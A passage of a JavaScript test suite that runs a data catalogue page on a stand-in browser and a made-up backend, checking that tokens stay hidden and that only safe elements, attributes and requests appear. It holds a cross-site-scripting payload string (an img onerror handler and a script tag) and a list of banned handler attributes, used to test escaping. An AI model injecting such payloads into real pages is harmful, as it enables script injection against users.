'use strict';
/*
 * Tests of the page itself (pcldb/web/app.js, part 2), run with Node:
 *
 *     node tests/web_page_test.js
 *
 * tests/test_web_static.py runs this file when Node is installed. It needs no package. The page's
 * script runs unchanged on a small stand-in for a browser (just the parts of the page model the
 * script uses, built from the real index.html) against a made-up backend that answers in the
 * exact shapes of section 11 of the specification. Every person, code, token and address below
 * is made up for the test.
 *
 * What a stand-in cannot show (layout, colours, a real keyboard, a real download) is not tested
 * here.
 */
const assert = require('assert');
const fs = require('fs');
const path = require('path');

const WEB = path.join(__dirname, '..', 'pcldb', 'web');
const SOURCE = fs.readFileSync(path.join(WEB, 'app.js'), 'utf8');
const HTML = fs.readFileSync(path.join(WEB, 'index.html'), 'utf8');

const SAFE_TAGS = ('button caption code dd details div dl dt h3 h4 li option p pre section span summary table ' +
  'tbody td th thead time tr ul wbr').split(' ');
const SAFE_ATTRIBUTES = ('class type title scope colspan datetime tabindex role hidden value id aria-label aria-live ' +
  'aria-expanded aria-controls open').split(' ');
// The icons are drawn in index.html and only ever copied: these are all the parts a copy may have.
const ICON_TAGS = ['svg', 'path', 'circle', 'rect'];
const ICON_ATTRIBUTES = ['class', 'viewbox', 'aria-hidden', 'focusable', 'd', 'cx', 'cy', 'r', 'x', 'y', 'width', 'height', 'rx'];
const FIXED_ATTRIBUTES = ['aria-busy', 'aria-current', 'open'];     // set with fixed values outside el()
const HIDDEN = /[\u{0}-\u{8}\u{b}\u{c}\u{e}-\u{1f}\u{7f}-\u{9f}\u{ad}\u{61c}\u{200b}-\u{200f}\u{2028}-\u{202e}\u{2060}-\u{206f}\u{feff}\u{e0000}-\u{e007f}]/u;

const RLO = '\u{202e}';       // right-to-left override
const EVIL = '<img src=x onerror=alert(1)>"\'><script>alert(2)</script>';
const LONG = 'long text <b>bold</b> '.repeat(5000);      // about 100 kB
const ADMIN_TOKEN = 'pcl_' + 'A1b2C3d4'.repeat(5) + 'xyz';
const VIEWER_TOKEN = 'pcl_' + 'V9w8X7y6'.repeat(5) + 'abc';
const CODE = 'Zm9vYmFyYmF6cXV4LV8wMTIzNDU2Nzg5';
const HANG = {hang: true};
const NETWORK = {network: true};

// ---- a small stand-in for the page model ---------------------------------------------------------

class Node {
  constructor() {
    this.parentNode = null;
    this.childNodes = [];
  }
  removeChild(child) {
    const index = this.childNodes.indexOf(child);
    if (index === -1) throw new Error('removeChild: not a child');
    this.childNodes.splice(index, 1);
    child.parentNode = null;
    return child;
  }
}

class Text extends Node {
  constructor(data) {
    super();
    this.data = String(data);
  }
  get textContent() { return this.data; }
}

class Fragment extends Node {
  appendChild(child) { return attach(this, child); }
}

function attach(parent, child) {
  if (child instanceof Fragment) {
    child.childNodes.slice().forEach(function (node) { attach(parent, node); });
    return child;
  }
  if (!(child instanceof Node)) throw new TypeError('appendChild needs a node');
  if (child.parentNode) child.parentNode.removeChild(child);
  child.parentNode = parent;
  parent.childNodes.push(child);
  return child;
}

class Element extends Node {
  constructor(tag, browser) {
    super();
    this.tagName = tag;
    this.browser = browser;
    this.attributes = new Map();
    this.listeners = {};
    this.disabled = false;
    this.value = '';
    this.checked = false;
    this.selectedIndex = 0;
    this.selectionStart = 0;
    this.selectionEnd = 0;
    this.byScript = false;
    const element = this;
    this.classList = {
      contains: function (name) { return element.className.split(/\s+/).indexOf(name) !== -1; },
      toggle: function (name, force) {
        const names = element.className.split(/\s+/).filter(Boolean);
        const has = names.indexOf(name) !== -1;
        const want = force === undefined ? !has : Boolean(force);
        if (want && !has) names.push(name);
        if (!want && has) names.splice(names.indexOf(name), 1);
        element.attributes.set('class', names.join(' '));
        return want;
      }
    };
  }
  appendChild(child) { return attach(this, child); }
  get textContent() {
    return this.childNodes.map(function (node) { return node.textContent; }).join('');
  }
  set textContent(value) {
    this.childNodes.slice().forEach(function (node) { node.parentNode = null; });
    this.childNodes = [];
    if (String(value) !== '') {
      this.browser.log.texts.push(String(value));
      attach(this, new Text(value));
    }
  }
  setAttribute(name, value) {
    if (this.byScript || this.browser.running) this.browser.log.attributes.push({tag: this.tagName, name: name, value: String(value)});
    this.attributes.set(name, String(value));
  }
  getAttribute(name) { return this.attributes.has(name) ? this.attributes.get(name) : null; }
  hasAttribute(name) { return this.attributes.has(name); }
  removeAttribute(name) { this.attributes.delete(name); }
  get id() { return this.getAttribute('id') || ''; }
  get className() { return this.getAttribute('class') || ''; }
  set className(value) { this.attributes.set('class', String(value)); }
  get hidden() { return this.attributes.has('hidden'); }
  set hidden(value) {
    if (value) this.attributes.set('hidden', '');
    else this.attributes.delete('hidden');
  }
  get open() { return this.attributes.has('open'); }
  get options() { return this.childNodes.filter(function (node) { return node.tagName === 'option'; }); }
  remove(index) { this.removeChild(this.options[index]); }
  showModal() {
    if (this.open) throw new Error('showModal: the dialog is already open');
    this.attributes.set('open', '');
    this.browser.log.modal += 1;
    const first = this.querySelectorAll('button')[0];
    if (first) first.focus();
  }
  close() {
    if (!this.open) return;
    this.attributes.delete('open');
    const dialog = this;
    setImmediate(function () { dialog.dispatch('close', {}); });
  }
  // A deep copy, as the page makes of an icon. The copy is noted so audit() can check it.
  cloneNode(deep) {
    const copy = new Element(this.tagName, this.browser);
    this.attributes.forEach(function (value, name) { copy.attributes.set(name, value); });
    if (deep) {
      this.childNodes.forEach(function (child) {
        attach(copy, child instanceof Text ? new Text(child.data) : child.cloneNode(true));
      });
    }
    this.browser.log.cloned.push(copy);
    return copy;
  }
  setRangeText(text, start, end) {
    this.value = this.value.slice(0, start) + text + this.value.slice(end);
    this.selectionStart = this.selectionEnd = start + text.length;
  }
  addEventListener(type, listener) {
    (this.listeners[type] = this.listeners[type] || []).push(listener);
  }
  // Runs the listeners here and on every element above, as a browser does for these events.
  dispatch(type, details) {
    const event = Object.assign({type: type, target: this, defaultPrevented: false}, details || {});
    event.preventDefault = function () { event.defaultPrevented = true; };
    for (let node = this; node; node = node.parentNode) {
      (node.listeners && node.listeners[type] || []).slice().forEach(function (listener) { listener(event); });
    }
    return event;
  }
  click() {
    if (this.tagName === 'a') {
      this.browser.log.followed.push({href: this.href, download: this.download, target: this.target, rel: this.rel});
    }
    this.dispatch('click', {});
  }
  focus() {
    if (shown(this)) this.browser.document.activeElement = this;
  }
  contains(node) {
    for (let current = node; current; current = current.parentNode) if (current === this) return true;
    return false;
  }
  querySelectorAll(tag) {
    const found = [];
    (function walk(node) {
      node.childNodes.forEach(function (child) {
        if (child instanceof Element) {
          if (child.tagName === tag) found.push(child);
          walk(child);
        }
      });
    })(this);
    return found;
  }
  closest(selector) {
    const wanted = selector.split(',').map(function (part) { return part.trim(); });
    for (let node = this; node instanceof Element; node = node.parentNode) {
      if (wanted.indexOf(node.tagName) !== -1) return node;
    }
    return null;
  }
}

// True when nothing above the element (or the element itself) is hidden.
function shown(node) {
  for (let current = node; current; current = current.parentNode) {
    if (current instanceof Element && current.hidden) return false;
    if (current instanceof Element && current.tagName === 'dialog' && !current.open) return false;
  }
  return true;
}

function everyElement(root) {
  const found = [];
  (function walk(node) {
    node.childNodes.forEach(function (child) {
      if (child instanceof Element) {
        found.push(child);
        walk(child);
      }
    });
  })(root);
  return found;
}

// Elements that start on a line of their own (or in a cell of their own), as the style sheet has them.
const BLOCKS = ['p', 'div', 'li', 'tr', 'td', 'th', 'dt', 'dd', 'h2', 'h3', 'h4', 'section', 'pre', 'ul', 'dl', 'table',
  'caption', 'details', 'summary'];

// The text a person can read below a node (hidden parts left out), as one line.
function seen(node) {
  const parts = [];
  (function walk(current) {
    if (current instanceof Text) parts.push(current.data);
    else if (current instanceof Element && !current.hidden && !(current.tagName === 'dialog' && !current.open)) {
      const block = BLOCKS.indexOf(current.tagName) !== -1;
      if (block) parts.push(' ');
      current.childNodes.forEach(walk);
      if (block) parts.push(' ');
    }
  })(node);
  return parts.join('').replace(/\s+/g, ' ').trim();
}

const VOID = ['meta', 'link', 'input', 'br', 'hr', 'wbr'];

function parseHtml(html, browser) {
  const root = new Element('#root', browser);
  const stack = [root];
  const token = /<!--[\s\S]*?-->|<!DOCTYPE[^>]*>|<\/([a-zA-Z0-9]+)\s*>|<([a-zA-Z0-9]+)((?:\s+[^\s=>\/]+(?:\s*=\s*(?:"[^"]*"|'[^']*'))?)*)\s*(\/?)>|([^<]+)/g;
  let match;
  while ((match = token.exec(html)) !== null) {
    const parent = stack[stack.length - 1];
    if (match[1]) {
      for (let i = stack.length - 1; i > 0; i -= 1) {
        if (stack[i].tagName === match[1].toLowerCase()) {
          stack.length = i;
          break;
        }
      }
    } else if (match[2]) {
      const element = new Element(match[2].toLowerCase(), browser);
      const attribute = /([^\s=>\/]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'))?/g;
      let pair;
      while ((pair = attribute.exec(match[3] || '')) !== null) {
        element.attributes.set(pair[1].toLowerCase(), pair[2] !== undefined ? pair[2] : (pair[3] !== undefined ? pair[3] : ''));
      }
      if (element.attributes.has('disabled')) element.disabled = true;
      if (element.attributes.has('value') && element.tagName !== 'option') element.value = element.attributes.get('value');
      attach(parent, element);
      // A drawing's parts close themselves (<path ... />); everything else waits for its end tag.
      if (VOID.indexOf(element.tagName) === -1 && match[4] !== '/') stack.push(element);
    } else if (match[5] !== undefined) {
      attach(parent, new Text(match[5].replace(/\s+/g, ' ')));
    }
  }
  return root;
}

// ---- the made-up backend: the exact result shapes of section 11 ----------------------------------

const COLLECTION = '8e804f3a-5bac-4b6d-9836-bcd5b9c133ec';

function meReply(who) {
  const people = {
    admin: {user: {name: 'admin', display_name: 'Local admin', role: 'admin'}, capabilities: ['ask', 'sql', 'register', 'manage']},
    analyst: {user: {name: 'demo-analyst', display_name: null, role: 'analyst'}, capabilities: ['ask', 'sql']},
    viewer: {user: {name: 'demo-viewer', display_name: 'Demo viewer', role: 'viewer'}, capabilities: ['ask']}
  };
  return Object.assign({}, people[who], {
    engine: {name: 'postgresql', version: '18.7'},
    defaults: {include_simulated: true, sql_max_rows: 1000},
    storage: {ssh_host: 'datatransfer.arc.vt.edu', project_path: '/projects/pcl_photonics', collection_id: COLLECTION},
    version: '0.1.0'
  });
}

function statusReply(changes) {
  const reply = {
    database: {engine: 'postgresql', version: '18.7', where: 'this computer, port 15439', sessions: 16, files: 420,
      runs: 14, points: 156, demo: true, instruments: [{instrument: 'raman-portable', sessions: 12}],
      newest_started_utc: '2026-11-17T03:50:15.281Z'},
    search: {backend: 'local', index_set: false, signed_in: false,
      entries: {pending: 16, sent: 0, synced: 0, failed: 0, delete_pending: 0}},
    assistant: {enabled: true, key_present: true, model: 'gpt-oss-120b', state: 'ready', note: 'The ARC LLM service answers and accepts the key.'},
    registrations: [
      {at_utc: '2026-11-17T04:00:00.000Z', user_name: 'admin', session_path: 'raw/raman-portable/simulated/demo_1', action: 'created', source: 'demo'},
      {at_utc: '2026-11-17T04:01:00.000Z', user_name: null, session_path: 'raw/raman-portable/simulated/demo_2', action: 'rejected', source: 'upload'}
    ]
  };
  Object.keys(changes || {}).forEach(function (key) { reply[key] = Object.assign({}, reply[key], changes[key]); });
  return reply;
}

function entry(number, changes) {
  const folder = '1d_y_scan_2026111' + number + '_225015_281';
  const data = '/pcl_photonics/raw/raman-portable/simulated/' + folder;
  return Object.assign({
    subject: 'urn:pcl:dataset:00000000-0000-5000-8000-00000000000' + number, title: folder, instrument: 'raman-portable',
    folder: folder, session_id: 'demo-000' + number, path: 'raw/raman-portable/simulated/' + folder, data_path: data,
    globus_url: 'globus://' + COLLECTION + data + '/',
    web_url: 'https://app.globus.org/file-manager?origin_id=' + COLLECTION + '&origin_path=' + encodeURIComponent(data + '/'),
    method: '1d_y_scan', completion: 'complete', format: 'raman-session/1 folder', review_state: 'pending',
    sample_ids: ['130'], tags: ['demo'], labels: ['UNKNOWN', 'adenine'],
    label_counts: [{label: 'UNKNOWN', count: 4}, {label: 'adenine', count: 3}], models: ['pca_svm_pure_20260922'],
    simulated: true, is_copy: false, withdrawn: false, corrected: false, items: 13, items_planned: 13, files: 23,
    bytes: 184320, n_needs_review: 1, started: '2026-11-1' + number + 'T03:50:15Z', uploaded: '2026-11-1' + number + 'T04:50:15Z'
  }, changes || {});
}

function askReply(changes) {
  const results = [entry(6), entry(5), entry(4)];
  return Object.assign({
    question: 'Which sessions have adenine?', answer: '3 sessions match. The newest is ' + results[0].folder + '.',
    answer_by: 'llm', planned_by: 'llm', interpretation: 'Sessions where labels has adenine, newest first (up to 10).',
    request: {'@version': 'query#1.0.0', q: '*', limit: 10, filters: [{type: 'match_any', field_name: 'labels', values: ['adenine']}]},
    backend: 'local', notices: [], total: 3, count: 3, results: results, facets: [],
    timing_ms: {plan: 2140, search: 3, answer: 3310}
  }, changes || {});
}

function sessionReply(changes, more) {
  const folder = '1d_y_scan_20261116_225015_281';
  const data = '/pcl_photonics/raw/raman-portable/simulated/' + folder;
  const session = Object.assign({
    path: 'raw/raman-portable/simulated/' + folder, instrument: 'raman-portable', area: 'simulated', folder: folder,
    session_name: folder, session_id: 'demo-0006', is_copy: false, started_utc: '2026-11-16T03:50:15.281Z',
    ended_utc: null, simulated: true, sample_ids: ['130'], operator: 'demo-operator-a', location: null,
    method: '1d_y_scan', items: 13, items_planned: 13, completion: 'complete', notes: 'demo, not real data',
    tags: ['demo'], format: 'raman-session/1 folder', uploaded_utc: '2026-11-16T04:50:15.000Z',
    upload_id: 'u000000000006', has_card: true, card_json: {schema: 'pcl-session/1'}, corrections_json: [],
    corrected: false, withdrawn: false, bytes: 184320, n_files: 2, sums_sha256: 'ab'.repeat(32),
    verified_utc: null, verify_ok: null,
    upload_json: {transport: 'globus', upload_id: 'u000000000006', checked: true, check_method: 'globus-checksum',
      checked_utc: '2026-11-16T04:55:00.000Z'},
    collection_id: COLLECTION, data_path: data, storage_path: '/projects' + data, globus_url: 'globus://' + COLLECTION + data + '/',
    web_url: 'https://app.globus.org/file-manager?origin_id=' + COLLECTION + '&origin_path=' + encodeURIComponent(data + '/'),
    subject: 'urn:pcl:dataset:00000000-0000-5000-8000-000000000006', registered_utc: '2026-11-16T05:00:00.000Z',
    registered_by: 'admin', updated_utc: '2026-11-16T05:00:00.000Z', source: 'demo', doc_sha256: 'cd'.repeat(32)
  }, changes || {});
  return Object.assign({
    session: session,
    files: {total: 2, shown: 2, items: [
      {rel_path: 'pcl_session.json', bytes: 1536, sha256: 'ef'.repeat(32), listed: true},
      {rel_path: 'session.json', bytes: 999, sha256: null, listed: false}]},
    runs: [{path: 'results/raman-portable/simulated/' + folder + '_classify', folder: folder + '_classify', kind: 'classify',
      made_utc: '2026-11-17T03:50:15.000Z', model_name: 'pca_svm_pure_20260922', run_by: 'classify-demo', valid: true}],
    labels: [{label: 'UNKNOWN', count: 4}, {label: 'adenine', count: 3}], review_state: 'pending', n_needs_review: 1
  }, more || {});
}

const SCHEMA = {engine: 'postgresql', schema: 'pcl', objects: [
  {name: 'sessions', kind: 'table', description: 'One row per session folder on ARC.', columns: [
    {name: 'path', type: 'text', nullable: false, description: 'Path of the session folder below the project folder.'},
    {name: 'Mixed Case', type: 'text', nullable: true, description: 'A made-up name that needs quotes.'}]},
  {name: 'session_summary', kind: 'view', description: 'Sessions with their labels.', columns: []}]};
const EXAMPLES = {engine: 'postgresql', examples: [{title: 'The newest sessions', sql: 'SELECT path FROM sessions ORDER BY started_utc DESC LIMIT 20'}]};

function errorReply(status, code, message, details) {
  return {status: status, body: {error: {code: code, message: message, details: details === undefined ? null : details}}};
}

// A backend for one test: `routes` maps "METHOD /path" to a reply, or to a function of the request.
function backend(who, routes) {
  const tokens = {};
  tokens[ADMIN_TOKEN] = 'admin';
  tokens[VIEWER_TOKEN] = 'viewer';
  return function (request) {
    const address = request.path.split('?')[0];
    const key = request.method + ' ' + address;
    if (routes && Object.prototype.hasOwnProperty.call(routes, key)) {
      const route = routes[key];
      return typeof route === 'function' ? route(request) : route;
    }
    if (key === 'POST /api/v1/signin') {
      return {status: 200, body: {token: who === 'viewer' ? VIEWER_TOKEN : ADMIN_TOKEN, expires_utc: '2026-11-18T03:50:15.281Z', user: meReply(who).user}};
    }
    const bearer = (request.headers.Authorization || '').replace(/^Bearer /, '');
    const person = tokens[bearer];
    if (!person) return errorReply(401, 'unauthorized', 'Sign in first: the access token is missing or not valid.');
    const sql = meReply(person).capabilities.indexOf('sql') !== -1;
    if (address.indexOf('/api/v1/sql') === 0 && !sql) return errorReply(403, 'forbidden', 'Expert SQL needs the analyst or admin role.');
    switch (key) {
      case 'GET /api/v1/me': return {status: 200, body: meReply(person)};
      case 'GET /api/v1/status': return {status: 200, body: statusReply()};
      case 'POST /api/v1/ask': return {status: 200, body: askReply()};
      case 'GET /api/v1/session': return {status: 200, body: sessionReply()};
      case 'GET /api/v1/sql/schema': return {status: 200, body: SCHEMA};
      case 'GET /api/v1/sql/examples': return {status: 200, body: EXAMPLES};
      case 'GET /api/v1/sql/history': return {status: 200, body: {items: []}};
      case 'POST /api/v1/sql': return {status: 200, body: {columns: [{name: 'path', type: 'text'}], rows: [['raw/raman-portable/simulated/demo_1']], row_count: 1, truncated: false, elapsed_ms: 12}};
      default: return errorReply(404, 'not_found', 'There is nothing at this address.');
    }
  };
}

// ---- one made-up browser tab --------------------------------------------------------------------

// Anything the page throws from a handler that nobody waits for lands here, and audit() reports it.
let currentLog = null;
process.on('unhandledRejection', function (reason) {
  if (currentLog) currentLog.errors.push(reason);
  else throw reason;
});

function makeStorage(initial, broken) {
  const data = Object.assign({}, initial || {});
  function check() { if (broken) throw new Error('storage is switched off'); }
  return {
    data: data,
    getItem: function (key) { check(); return Object.prototype.hasOwnProperty.call(data, key) ? data[key] : null; },
    setItem: function (key, value) { check(); data[key] = String(value); },
    removeItem: function (key) { check(); delete data[key]; }
  };
}

// options: {who, hash, token, arcUser, routes, backend, clipboard: 'ok'|'refuse'|'none', brokenStorage,
//           noReplaceState, noExecCommand}
function open(options) {
  const o = options || {};
  const browser = {running: false};
  const log = browser.log = {created: [], attributes: [], texts: [], requests: [], addresses: [], copied: [],
    followed: [], blobs: [], revoked: [], modal: 0, confirms: [], errors: [], cloned: []};
  const root = parseHtml(HTML, browser);
  const windowListeners = {};
  let clock = 0;
  let nextTimer = 1;
  const timers = new Map();
  function addTimer(run, wait, every) {
    const id = nextTimer;
    nextTimer += 1;
    timers.set(id, {run: run, at: clock + (wait || 0), every: every ? wait : 0});
    return id;
  }

  const location = {
    hash: o.hash || '', pathname: '/', search: '',
    replace: function (address) {
      log.addresses.push({how: 'location.replace', address: address});
      location.hash = address === '#' ? '' : address;
    }
  };
  const window = browser.window = {
    location: location,
    sessionStorage: makeStorage(o.token ? {'pcldb.token': o.token} : {}, o.brokenStorage),
    localStorage: makeStorage(o.arcUser !== undefined ? {'pcldb.arc_user': o.arcUser} : {}, o.brokenStorage),
    history: {
      replaceState: function (state, title, address) {
        if (o.noReplaceState) throw new Error('replaceState is not allowed here');
        log.addresses.push({how: 'replaceState', address: address});
        const at = address.indexOf('#');
        location.hash = at === -1 ? '' : address.slice(at);
      }
    },
    addEventListener: function (type, listener) { (windowListeners[type] = windowListeners[type] || []).push(listener); },
    setTimeout: function (run, wait) { return addTimer(run, wait, false); },
    clearTimeout: function (id) { timers.delete(id); },
    setInterval: function (run, wait) { return addTimer(run, wait, true); },
    clearInterval: function (id) { timers.delete(id); },
    getSelection: function () {
      return {toString: function () { return ''; }, removeAllRanges: function () {}, addRange: function (range) { log.selected = range.node; }};
    },
    // Only when a test asks for a wide screen; a page without matchMedia() must work too.
    matchMedia: o.wide === undefined ? undefined : function (query) {
      return {matches: o.wide === true && query === '(min-width: 900px)'};
    },
    confirm: function (words) {
      log.confirms.push(words);
      return o.confirm !== false;
    }
  };
  const document = browser.document = {
    readyState: 'complete',
    title: 'PCL data',
    activeElement: null,
    body: root.querySelectorAll('body')[0],
    addEventListener: function () {},
    getElementById: function (id) {
      return everyElement(root).find(function (element) { return element.id === id; }) || null;
    },
    createElement: function (tag) {
      const element = new Element(String(tag), browser);
      element.byScript = true;
      log.created.push(element);
      return element;
    },
    createTextNode: function (text) {
      log.texts.push(String(text));
      return new Text(text);
    },
    createDocumentFragment: function () { return new Fragment(); },
    createRange: function () { return {node: null, selectNodeContents: function (node) { this.node = node; }}; },
    contains: function (node) { return root.contains(node); },
    execCommand: function (command, ui, text) {
      if (o.noExecCommand || command !== 'insertText') return false;
      const box = document.activeElement;
      box.setRangeText(text, box.selectionStart, box.selectionEnd);
      return true;
    }
  };
  const navigator = {};
  if (o.clipboard !== 'none') {
    navigator.clipboard = {writeText: function (text) {
      if (o.clipboard === 'refuse') return Promise.reject(new Error('NotAllowedError'));
      log.copied.push(text);
      return Promise.resolve();
    }};
  }
  // The page's clock follows the made-up timers, so "3 s" on the page means three made-up seconds.
  const began = Date.now();
  class PageDate extends Date {
    static now() { return began + clock; }
  }
  class PageURL extends URL {
    static createObjectURL(blob) {
      log.blobs.push(blob);
      return 'blob:made-up/' + log.blobs.length;
    }
    static revokeObjectURL(address) { log.revoked.push(address); }
  }
  const answer = o.backend || backend(o.who || 'admin', o.routes);
  function fetch(address, request) {
    const sent = {
      path: address, method: request.method, headers: Object.assign({}, request.headers),
      body: request.body === undefined ? undefined : JSON.parse(request.body), raw: request.body,
      options: {mode: request.mode, credentials: request.credentials, cache: request.cache, redirect: request.redirect,
        referrerPolicy: request.referrerPolicy},
      hashThen: location.hash
    };
    log.requests.push(sent);
    return new Promise(function (resolve, reject) {
      function stop() {
        const error = new Error('The request was stopped.');
        error.name = 'AbortError';
        sent.stopped = true;
        reject(error);
      }
      if (request.signal.aborted) {
        stop();
        return;
      }
      request.signal.addEventListener('abort', stop);
      Promise.resolve(answer(sent)).then(function (reply) {
        if (reply === HANG) return;
        if (reply === NETWORK) {
          reject(new TypeError('Failed to fetch'));
          return;
        }
        const type = reply.type === undefined ? 'application/json; charset=utf-8' : reply.type;
        resolve({
          status: reply.status, ok: reply.status >= 200 && reply.status < 300,
          headers: {get: function (name) { return name.toLowerCase() === 'content-type' ? type : null; }},
          json: function () {
            if (reply.notJson) return Promise.reject(new SyntaxError('Unexpected token'));
            return Promise.resolve(JSON.parse(JSON.stringify(reply.body)));
          }
        });
      });
    });
  }

  function settle() {
    return new Promise(function (resolve) {
      let turns = 0;
      (function again() {
        turns += 1;
        if (turns > 12) resolve();
        else setImmediate(again);
      })();
    });
  }

  browser.root = root;
  browser.byId = function (id) {
    const element = document.getElementById(id);
    assert.ok(element, 'no element with the id ' + id);
    return element;
  };
  browser.seen = function (id) { return seen(id ? browser.byId(id) : root.querySelectorAll('body')[0]); };
  browser.shown = function (id) { return shown(browser.byId(id)); };
  browser.settle = settle;
  // A person clicks: a disabled or hidden control does nothing; a submit button sends its form;
  // one of the three links at the top changes the address.
  browser.click = async function (element) {
    assert.ok(shown(element), 'a person cannot click what is not shown: <' + element.tagName + ' id="' + element.id + '">');
    if (element.disabled) return;
    browser.running = true;
    element.focus();
    element.click();
    if (element.tagName === 'button' && element.getAttribute('type') === 'submit') {
      const form = element.closest('form');
      if (form) form.dispatch('submit', {});
    }
    if (element.tagName === 'a' && (element.getAttribute('href') || '').charAt(0) === '#') {
      await browser.go(element.getAttribute('href'));
    }
    await settle();
  };
  browser.go = async function (hash) {
    location.hash = hash;
    browser.running = true;
    (windowListeners.hashchange || []).slice().forEach(function (listener) { listener({type: 'hashchange'}); });
    await settle();
  };
  browser.type = async function (id, text, event) {
    const field = browser.byId(id);
    field.focus();
    field.value = text;
    field.selectionStart = field.selectionEnd = text.length;
    field.dispatch(event || 'change', {});
    await settle();
  };
  browser.key = async function (id, details) {
    const event = browser.byId(id).dispatch('keydown', details);
    await settle();
    return event;
  };
  browser.wait = async function (milliseconds) {
    const end = clock + milliseconds;
    for (;;) {
      let next = null;
      timers.forEach(function (timer, id) {
        if (timer.at <= end && (next === null || timer.at < next.timer.at)) next = {id: id, timer: timer};
      });
      if (next === null) break;
      clock = next.timer.at;
      if (next.timer.every) next.timer.at += next.timer.every;
      else timers.delete(next.id);
      next.timer.run();
      await settle();
    }
    clock = end;
  };
  browser.timers = timers;
  browser.buttons = function (id, words) {
    return browser.byId(id).querySelectorAll('button').filter(function (button) {
      return shown(button) && seen(button).indexOf(words) !== -1;
    });
  };
  browser.button = function (id, words) {
    const found = browser.buttons(id, words);
    assert.strictEqual(found.length, 1, 'expected one button "' + words + '" in #' + id + ', found ' + found.length);
    return found[0];
  };
  browser.paths = function (methodAndPath) {
    return log.requests.filter(function (request) { return request.method + ' ' + request.path.split('?')[0] === methodAndPath; });
  };

  browser.start = async function () {
    browser.running = true;
    currentLog = log;
    const run = new Function('window', 'document', 'navigator', 'fetch', 'URL', 'Element', 'module', 'AbortController', 'Blob',
      'Date', SOURCE);
    run(window, document, navigator, fetch, PageURL, Element, undefined, AbortController, Blob, PageDate);
    await settle();
    return browser;
  };
  return browser.start();
}

// What must hold after every test, whatever the backend sent: only harmless elements and
// attributes, nothing unseen in any text, links only to the Globus web app or to a download,
// requests only to the backend of this site, and the token in the Authorization header only.
// secrets: more texts that must never show up anywhere (tests/web_replay_test.js passes its own).
function audit(browser, secrets) {
  const log = browser.log;
  assert.deepStrictEqual(log.errors, [], 'the page threw: ' + log.errors.map(String).join('; '));
  const tokens = [ADMIN_TOKEN, VIEWER_TOKEN].concat(secrets || []);
  log.created.forEach(function (element) {
    if (element.tagName === 'a') {
      const download = element.download !== undefined;
      assert.ok(download ? /^blob:made-up\/\d+$/.test(element.href) : element.href.indexOf('https://app.globus.org/') === 0,
        'a link to somewhere else: ' + element.href);
      if (!download) {
        assert.strictEqual(element.target, '_blank');
        assert.strictEqual(element.rel, 'noopener noreferrer');
      }
    } else {
      assert.ok(SAFE_TAGS.indexOf(element.tagName) !== -1, 'the script made a <' + element.tagName + '>');
    }
    ['onclick', 'onerror', 'onload', 'style', 'src', 'srcdoc', 'action', 'formaction'].forEach(function (name) {
      assert.strictEqual(element[name], undefined, name + ' was set on a <' + element.tagName + '>');
    });
  });
  // A copy of an icon: only the drawing parts index.html has, never an address, a style or a handler.
  log.cloned.forEach(function (element) {
    assert.ok(ICON_TAGS.indexOf(element.tagName) !== -1, 'the script copied a <' + element.tagName + '>');
    element.attributes.forEach(function (value, name) {
      assert.ok(ICON_ATTRIBUTES.indexOf(name) !== -1, 'a copied icon has the attribute ' + name);
    });
    if (element.tagName === 'svg') {
      assert.strictEqual(element.getAttribute('aria-hidden'), 'true', 'an icon is hidden from screen readers');
      assert.strictEqual(element.getAttribute('id'), null, 'a copied icon keeps no id');
    }
  });
  log.attributes.forEach(function (attribute) {
    assert.ok(SAFE_ATTRIBUTES.indexOf(attribute.name) !== -1 || FIXED_ATTRIBUTES.indexOf(attribute.name) !== -1,
      'the script set the attribute ' + attribute.name + ' on a <' + attribute.tag + '>');
    assert.ok(!HIDDEN.test(attribute.value), 'an unseen character in the attribute ' + attribute.name);
    tokens.forEach(function (token) { assert.ok(attribute.value.indexOf(token) === -1, 'the token is in an attribute'); });
  });
  log.texts.forEach(function (text) {
    assert.ok(!HIDDEN.test(text), 'an unseen character reached the page: ' + JSON.stringify(text.slice(0, 60)));
    tokens.forEach(function (token) { assert.ok(text.indexOf(token) === -1, 'the token is in the page'); });
  });
  everyElement(browser.root).forEach(function (element) {
    if (element.id !== 'signin-token') {
      tokens.forEach(function (token) { assert.ok(String(element.value).indexOf(token) === -1, 'the token stayed in a field'); });
    }
  });
  log.requests.forEach(function (request) {
    assert.ok(/^\/api\/v1\/[a-z\/]+(\?path=[A-Za-z0-9%._~!*'()-]*)?$/.test(request.path), 'an odd address: ' + request.path);
    assert.deepStrictEqual(request.options, {mode: 'same-origin', credentials: 'omit', cache: 'no-store', redirect: 'error',
      referrerPolicy: 'no-referrer'});
    const names = Object.keys(request.headers).sort().join();
    assert.ok(['Accept', 'Accept,Authorization', 'Accept,Content-Type', 'Accept,Authorization,Content-Type'].indexOf(names) !== -1,
      'odd headers: ' + names);
    tokens.forEach(function (token) {
      assert.ok(request.path.indexOf(token) === -1, 'the token is in an address');
      assert.ok((request.raw || '').indexOf(token) === -1, 'the token is in a request body');
    });
    assert.ok(request.hashThen.indexOf('signin=') === -1, 'a request was made while the sign-in code was in the address');
  });
  log.addresses.forEach(function (entry) {
    tokens.concat([CODE]).forEach(function (secret) { assert.ok(entry.address.indexOf(secret) === -1, 'a secret is in the address'); });
  });
  Object.keys(browser.window.localStorage.data).forEach(function (key) {
    assert.strictEqual(key, 'pcldb.arc_user', 'only the ARC user name is kept in localStorage');
  });
  Object.keys(browser.window.sessionStorage.data).forEach(function (key) {
    assert.strictEqual(key, 'pcldb.token', 'only the token is kept in sessionStorage');
  });
}

// The text of the count above the results ("3 sessions"), or null.
function countOn(page) {
  const found = page.byId('ask-results').querySelectorAll('span').filter(function (span) { return span.className === 'count'; });
  return found.length === 1 ? found[0].textContent : null;
}

// Elements of this tag below box that are not copies of the page's own icons.
function madeFromText(page, box, tag) {
  return box.querySelectorAll(tag).filter(function (element) {
    let current = element;
    while (current && current.tagName !== 'svg') current = current.parentNode;
    return !(current && page.log.cloned.indexOf(current) !== -1);
  });
}

const tests = [];
function test(name, body) {
  tests.push({name: name, body: body});
}

// ---- sign in, the token, the code in the address ----------------------------------------------

test('without a token the page shows the sign-in form and asks the backend nothing', async function () {
  const page = await open({});
  assert.ok(page.shown('view-signin'));
  assert.ok(!page.shown('view-app') && !page.shown('tabs') && !page.shown('who'));
  assert.strictEqual(page.log.requests.length, 0);
  assert.strictEqual(page.document.activeElement, page.byId('signin-token'));
  assert.strictEqual(page.document.title, 'Sign in - PCL data');
  assert.strictEqual(page.seen('signin-note'), '');
  audit(page);
});

test('a sign-in link: the code leaves the address before the first request, then the token is kept', async function () {
  const page = await open({hash: '#signin=' + CODE});
